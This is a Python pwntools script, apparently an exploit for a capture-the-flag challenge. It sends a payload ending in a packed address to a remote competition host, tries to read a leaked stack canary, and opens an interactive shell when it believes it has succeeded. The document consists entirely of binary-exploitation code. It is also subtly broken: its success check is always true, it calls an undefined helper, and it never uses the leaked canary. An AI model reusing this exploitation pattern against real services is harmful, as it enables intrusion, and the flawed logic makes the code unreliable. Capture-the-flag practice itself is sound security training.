#!/usr/bin/env python3

from pwn import *



#context.binary = exe 

context.log_level = 'info'

DELAY = 0.05

def conn():
    return remote("vm1.ctfeldjazair.dz", 12397, ssl=True)

def attempt():
    try:
        str = b"whatever"
        r = connect()
        r.sendline(str + p64(0x402020))
        r.recvuntil(b"Salam, Merhba bikoum f siyi zahrek !\n")
        canary = r.recvuntil(b"Ana").decode().strip().replace('Ana', "")
        str = canary
        
        resp = r.recv(timeout=1)
        if resp:
            output = resp.decode('utf-8', errors='ignore')
            if "flag" or "djazairctf" in output.lower():
                log.success(f"[!] Flag found !")
                r.interactive()
                return True
        else:
            log.debug(f"[-] No response with canary {str}")
    except EOFError:
        log.debug(f"[-] EOF at {str}")
    except Exception as e:
        log.error(f"[!] Exception at {str}: {e}")
    finally:
        try:
            r.close()
        except:
            pass
    return False

def main():
    r = conn()
   
    while True:
        if attempt():
            break
        time.sleep(DELAY)
        

    r.interactive()


if __name__ == "__main__":
    main()
